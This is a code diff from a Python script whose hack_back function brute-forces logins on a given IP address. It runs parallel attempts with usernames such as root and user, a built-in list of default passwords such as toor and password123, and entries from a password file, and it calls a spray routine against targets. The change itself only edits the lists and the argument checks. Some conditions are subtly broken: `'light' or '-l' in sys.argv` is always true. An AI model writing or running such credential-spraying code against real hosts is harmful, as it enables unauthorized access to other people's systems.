@@ -122,12 +122,12 @@ def attempt(ip,uname,passwd):
 def hack_back(ip, determined):
     p = multiprocessing.Pool(processes=4)
     success = {}
-    names = ['root', 'admin', 'user']  #
+    names = ['root', 'user']  # 'admin',
     start = time.time()
     connected = False
     common = ['admin', 'default', 'password', 'password123', 'toor', 'root']
     if determined:
-        for entry in swap('common_passwords.txt', False):
+        for entry in list(set(swap('common_passwords.txt', False))):
             common.append(entry)   # random.shuffle(common
     else:
         for entry in swap('common_passwords.txt', False)[0:40]:
@@ -239,7 +239,7 @@ if __name__ == '__main__':
     if 'light' or '-l' in sys.argv:
         brute_force = False
 
-    if 'target' in sys.argv and '-i' in sys.argv:
+    if 'target' in sys.argv and ('-i' or '!!') in sys.argv:
         spray(ip_loc, sys.argv[2], c_codes, True)
     elif 'target' in sys.argv:
         spray(ip_loc, sys.argv[2], c_codes, False)
